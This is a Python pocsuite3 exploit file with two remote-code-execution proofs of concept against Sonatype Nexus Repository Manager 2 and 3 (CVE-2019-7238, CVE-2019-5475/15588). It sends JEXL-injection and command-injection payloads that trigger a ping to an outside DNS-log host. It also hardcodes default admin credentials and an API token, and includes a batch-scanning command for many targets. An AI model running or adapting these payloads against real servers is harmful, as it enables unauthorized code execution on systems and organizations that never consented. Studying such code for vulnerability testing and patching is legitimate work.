#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
from string import ascii_letters

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

'''
CVE-2019-7238
需要Nexus服务器上有资源（比如Jar包）
'''
class Nexus3_RCE_POC(POCBase):
    vulID = 'Nexus3-CVE-2019-7238'
    appName = 'Nexus3'
    appVersion = 'Nexus Repository Manager OSS/Pro 3.6.2 版本到 3.14.0 版本'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-02-05'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2019-02-20'  # 编写 PoC 的日期
    updateDate = '2020-02-17'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/P1KC7wadbEZbHvavYQjbVA']  # 漏洞地址来源,0day不用写
    name = 'Nexus3 RCE'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)

    http_proxy  = "http://127.0.0.1:8087"
    https_proxy = "https://127.0.0.1:8087"
    proxies = {"http": http_proxy, "https": https_proxy}

    def _verify(self):
        result={}

        vul_url = self.url
        
        target_url = vul_url + "/service/extdirect"

        headers = {'Referer':''}
        j = {
            "action":"coreui_Component",
            "method":"previewAssets",
            "data":[
                {"page":1,"start":0,"limit":25,"filter":[
                    {"property":"repositoryName","value":"*"},
                    {"property":"expression","value":"1.class.forName('java.lang.Runtime').getRuntime().exec('ping {0}.{1}').waitFor()".format(self.BANNER, self.DOMAIN)},
                    {"property":"type","value":"jexl"}]
                }
            ],
            "type":"rpc","tid":4}
        
        try:
            req.post(target_url, json=j, headers=headers, proxies=self.proxies)
        except Exception as e:
            e.printStackTrace()
        
        time.sleep(2) # 休眠2s等待ceye生成记录
        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            return self.save_output(result)
        return self.save_output(result)

    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            name = d['data'][0]['name']
            if self.BANNER in name:
                return True
        except Exception:
            return False            

    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


'''
CVE-2019-5475/CVE-2019-15588
需要管理员权限
'''
class Nexus2_RCE_POC(POCBase):
    vulID = 'Nexus2-CVE-2019-5475_15588'
    appName = 'Nexus2'
    appVersion = 'Nexus Repository Manager OSS/Pro <= 2.14.13'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-09-09'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2019-09-13'  # 编写 PoC 的日期
    updateDate = '2020-02-17'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://hackerone.com/reports/654888']  # 漏洞地址来源,0day不用写
    name = 'Nexus2 RCE'  # PoC 名称
    appPowerLink = ['https://support.sonatype.com/hc/en-us']  # 漏洞厂商主页地址
    desc = '''
        Nexus Repository Manager 2 RCE
    '''  # 漏洞简要描述
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)

    http_proxy  = "http://127.0.0.1:8087"
    https_proxy = "https://127.0.0.1:8087"
    proxies = {"http": http_proxy, "https": https_proxy}

    def _verify(self):
        result={}
        
        capa_id_url = self.url + "/nexus/service/siesta/capabilities"


        headers = {
            "Accept": "application/json",
            "Authorization": "Basic YWRtaW46YWRtaW4xMjM=",    # base64 version of admin:admin123, ref: CVE-2019-9629
        }

        l_payload = [
            "ping {0}.{1}", 
            "ping {0}.{1} & /createrepo",
            "ping {0}.{1} ; /createrepo",
            "ping {0}.{1} | /createrepo",
            "ping {0}.{1} || /createrepo",
        ]

        vul_url = self.get_vul_url(capa_id_url, headers)

        target_url = vul_url
        
        try:
            for i in range(len(l_payload)):
                json_payload = self.get_json_payload(l_payload[i])
                req.put(target_url, json=json_payload, headers=headers, proxies=self.proxies)
        except Exception as e:
            e.printStackTrace()
        
        time.sleep(2) # 休眠2s等待ceye生成记录
        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            return self.save_output(result)
        return self.save_output(result)


    def get_json_payload(self, p_payload):
        return {
                "typeId": "yum",
                "enabled": "true",
                "properties": [
                {
                    "key": "createrepoPath",
                    "value": p_payload.format(self.BANNER, self.DOMAIN)
                }
              ]
            }

    ''' fetch the capability id '''
    def get_vul_url(self, p_url, p_headers):
        r = req.get(p_url, verify=False, headers=p_headers, allow_redirects=False)
        capa_id = ""
    
        if r.status_code == 200:
            if r.json():
                for j in r.json():
                    if j['capability']['typeId'] == "yum":
                        print("[*] Vulnerable id is: {0}".format(j['capability']['id']))
                        capa_id = j['capability']['id']

        elif r.status_code == 401:
            print("[!] User credentials wrong! Quit!")
            sys.exit()

        p_vul_url = p_url + "/" + capa_id
        return p_vul_url

    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            name = d['data'][0]['name']
            if self.BANNER in name:
                return True
        except Exception:
            return False            

    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

# 注册类
register_poc(Nexus3_RCE_POC)    # CVE-2019-7238
register_poc(Nexus2_RCE_POC)    # CVE-2019-5475/CVE-2019-15588

"""批量验证
pocsuite -r Nexus_poc.py --verify -f results.txt --threads 10 --report report.html
"""


